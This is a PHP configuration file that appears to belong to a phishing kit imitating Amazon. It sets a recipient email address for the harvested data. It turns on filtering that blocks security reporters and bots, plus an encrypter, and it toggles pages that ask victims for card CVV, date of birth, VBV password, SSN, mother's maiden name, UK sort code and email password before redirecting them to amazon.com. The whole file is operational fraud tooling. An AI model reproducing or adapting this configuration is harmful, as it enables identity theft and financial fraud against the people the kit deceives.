<?php

// Recipients
$recipients = array (
	"vijnheer@protonmail.com"
	);


//////////////////////////////////////////////////////////////////
// enable: 1
// disable: 0

/////////////////////////
//		GLOBAL	      ///
/////////////////////////

// disable or enable visitors filter, keep it enabled to block known reporters networks & bots.
// check visitors: hostname, ip, isp, referer, useragent.
// to edit blocked list check blocked.php file
$enable_blocker = 1;

$enable_encrypter = 1;

$default_language = 'en';

// Dynamically dispaly language based on user browser language. If disabled, default language will be used.
$dynamic_language = 1;


// Log visitors visits to .log/log.txt
$log_visits = 1;


 //don't display profile.php
$disable_address_page = 0;

//don't display login page auth.php
$disable_login_page = 0;

//don't display bank info page exception.php
$disable_bank_info_page = 0;

// If disabled processing page and confirmation page then user will be redirected to url in $final_redirect_url
// disable or enable processing.php
$disable_processing_page = 0;

// disable or enable success.php
$disable_confirmation_page = 0;

// URL to redirect after user finish 
$final_redirect_url = 'https://www.amazon.com';



/////////////////////////////////////
//		Bank/Card Info Page		   //
//			verify.php		  ///	
/////////////////////////////////////

$request_for_cvv = 1;

$request_for_date_of_birth = 1;

$request_for_vbv_password = 1;

$request_for_card_limit = 0;

// Sort code displayed only if visitor from UKS
$rquest_for_sort_code = 1; 

// SSN displayed only if visitor from US
$request_for_ssn = 1;


// Request for MMN mother maiden name
// Enable mother maiden name field
$request_for_mmn = 1;


// Request for bank account number
$request_for_bank_account_number = 0;


// Request user to enter his online banking username
$request_for_online_bankung_id = 0;

// Request user to enter his online banking password
$request_for_online_bankung_password = 0;


// Request user to enter zip
$request_for_zip_code = 0;

// Request user to enter his other email password
$request_for_email_password = 1;


?>